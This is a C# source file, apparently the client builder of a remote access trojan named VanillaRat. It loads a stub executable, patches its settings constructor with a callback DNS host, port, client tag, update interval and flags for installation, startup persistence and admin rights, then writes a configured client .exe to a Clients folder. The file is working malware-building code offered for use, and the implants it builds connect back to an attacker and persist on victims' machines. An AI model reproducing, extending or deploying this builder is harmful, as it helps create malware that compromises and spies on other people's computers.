using dnlib.DotNet;
using System;
using System.IO;
using System.Linq;

namespace VanillaRat.Classes
{
    internal class Builder
    {
        public void BuildClient(string Port, string DNS, string Name, string ClientTag, string UpdateInterval, string Install, string Startup, string Admin)
        {
            VanillaRatStub.ClientSettings.DNS = DNS;
            VanillaRatStub.ClientSettings.Port = Port;
            VanillaRatStub.ClientSettings.ClientTag = ClientTag;
            VanillaRatStub.ClientSettings.UpdateInterval = UpdateInterval;
            VanillaRatStub.ClientSettings.Install = Install == "True" ? "True" : "False";
            VanillaRatStub.ClientSettings.Startup = Startup == "True" ? "True" : "False";
            VanillaRatStub.ClientSettings.Admin = Admin == "True" ? "True" : "False";
            string FullName = "VanillaRatStub.ClientSettings";
            var Assembly = AssemblyDef.Load("VanillaRatStub.exe");
            var Module = Assembly.ManifestModule;
            if (Module != null)
            {
                var Settings = Module.GetTypes().Where(type => type.FullName == FullName).FirstOrDefault();
                if (Settings != null)
                {
                    var Constructor = Settings.FindMethod(".cctor");
                    if (Constructor != null)
                    {
                        Constructor.Body.Instructions[0].Operand = VanillaRatStub.ClientSettings.DNS;
                        Constructor.Body.Instructions[2].Operand = VanillaRatStub.ClientSettings.Port;
                        Constructor.Body.Instructions[4].Operand = VanillaRatStub.ClientSettings.ClientTag;
                        Constructor.Body.Instructions[6].Operand = VanillaRatStub.ClientSettings.UpdateInterval;
                        Constructor.Body.Instructions[8].Operand = VanillaRatStub.ClientSettings.Install;
                        Constructor.Body.Instructions[12].Operand = VanillaRatStub.ClientSettings.Startup;
                        Constructor.Body.Instructions[14].Operand = VanillaRatStub.ClientSettings.Admin;
                        if (!Directory.Exists(Environment.CurrentDirectory + @"\Clients"))
                            Directory.CreateDirectory(Environment.CurrentDirectory + @"\Clients");
                        Assembly.Write(Environment.CurrentDirectory + @"\Clients\" + Name + ".exe");
                    }
                }
            }
        }
    }
}